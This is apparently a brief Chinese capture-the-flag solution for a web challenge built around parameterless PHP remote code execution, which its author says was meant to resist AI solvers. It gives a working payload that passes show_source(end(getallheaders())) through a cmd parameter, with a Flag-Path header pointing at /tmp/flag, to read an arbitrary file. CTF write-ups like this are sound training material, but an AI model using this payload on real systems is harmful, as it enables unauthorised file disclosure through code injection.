### Solve

设计为防 web AK 题

一般的无参数 RCE 太容易被 AI 一把梭了，来点大伙不知道的

用一般的无参 RCE 发现当前目录没有 flag 文件，那么只能在别的地方了

这里是 /tmp

Payloads：

cmd=show_source(end(getallheaders()));

Flag-Path: /tmp/flag

![1763819486199](image/solve/1763819486199.png)
